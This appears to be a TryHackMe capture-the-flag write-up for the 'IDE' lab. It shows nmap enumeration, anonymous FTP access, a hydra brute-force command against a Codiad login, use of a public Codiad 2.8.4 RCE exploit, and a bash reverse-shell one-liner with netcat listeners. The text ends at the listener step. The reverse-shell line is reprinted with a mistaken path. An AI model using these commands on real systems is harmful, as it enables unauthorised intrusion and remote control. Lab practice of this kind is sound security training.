# IDE | THM
### Difficulty Level: Easy
-------------------------------------------------

![image](https://cdn-images-1.medium.com/max/1000/1*Yo40ffh6pfA0xQPrlNkdiQ.png)

First, nmap scan to enumarate the system and save the output into a file:

```
nmap -p- -T4 -A -sC -sV  10.10.36.144 -oN nmap.txt
```

-p- Which means scan all ports instead of the 1000 common ports.

-T4 - Controls the timing of the scan. On that case, level 4 to make it aggresive and fast.   

-A - Aggresive scan. 

-sC - Deafult nmap script. 

-sV - Services version. 

-oN - Saves the output into a file. 

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 16:07 EDT
Nmap scan report for 10.10.36.144
Host is up (0.11s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.198.161
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/11%OT=21%CT=1%CU=39457%PV=Y%DS=2%DC=T%G=Y%TM=65EF
OS:664F%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=FE%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)SEQ(SP=FF%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%
OS:TS=A)SEQ(SP=FF%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)SEQ(SP=FF%GCD=1%ISR=10F%TI=Z
OS:%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M50
OS:8ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%
OS:W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=
OS:Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   156.10 ms 10.9.0.1
2   157.85 ms 10.10.36.144

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 488.51 seconds
```
There are 4 open ports:

21 - FTP

22 - SSH

80 - HTTP

62337 - HTTP 

Start with FTP. There is Anonymous FTP login which means entry to FTP server without any credentials.

```bash
ftp anonymous@10.10.36.144
```

![image](https://cdn-images-1.medium.com/max/1000/1*MVloOCGmve8YyXK4X_TTDQ.png)

As we can see, there is a file. Let's get it.

![image](https://cdn-images-1.medium.com/max/1000/1*cMiKCn9e597HB3EliUrSGQ.png)

There is a message:

```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

Let's move on to the browser and see what is the results of port 80.

![image](https://cdn-images-1.medium.com/max/1000/1*Hrz8Xm3kkwlF9JzIOuw9bw.png)

There is apache default page. On other cases, I used to keep scanning it with gobuster to enumarate other directories on the system.
But there is another port that runs HTTP service on it so let's check it:

```
http://<machine-address>:62337
```

![image](https://cdn-images-1.medium.com/max/1000/1*gpiBdpXmt5DCKZC__qVyOQ.png)

There is login page to codiad v2.8.4

What is codiad?
Codiad is an open-source web-based integrated development environment (IDE).

Remember this?

```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```
I tried some default passwords till i made it.

![image](https://cdn-images-1.medium.com/max/1000/1*HiQuMJxSJhQdaNdVxhxqMg.png)

 If you don't know what is the password so I'll use hydra to get it:

```
hydra -l john -P /usr/share/wordlists/rockyou.txt <machine-ip> -s 62337 http-post-form "/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:Incorrect Username or Password"
```


The next step is to check if there is any CVE to this codiad version to exploit with serachsploit.

```
searchsploit codiad 2.8.4
```

![image](https://cdn-images-1.medium.com/max/1000/1*sUkIiY8Sby0fFbYnDMXzXQ.png)

Grab the exploit into your machine:

```
searchsploit -m 49705.py
```

CVE-2018-14009: 
This exploit allows RCE on codiad v2.8.4.

While execute it, there is a banner with usage information.

```
python3 49705.py
Usage : 
        python 49705.py [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
        python 49705.py [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
Example : 
        python 49705.py http://localhost/ admin admin 8.8.8.8 8888 linux
        python 49705.py http://localhost:8080/ admin admin 8.8.8.8 8888 windows
Author : 
        WangYihang <wangyihanger@gmail.com>
```

We have the credentials for that so try it:

```
python3 49705.py http://10.10.36.144:62337/ john password <tun-ip> 2222 linux

[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/<tun-ip>/2223 0>&1 2>&1"' | nc -lnvp 2222
nc -lnvp 2223
[+] Please confirm that you have done the two command above [y/n]
[Y/n]

```

On your machine run this command first:

```
echo 'bash -c "bash -i >/dev/<tun-address>/2223 0>&1 2>&1"' | nc -lnvp 2222
```

secondly,
```
nc -lnvp 2223
```


































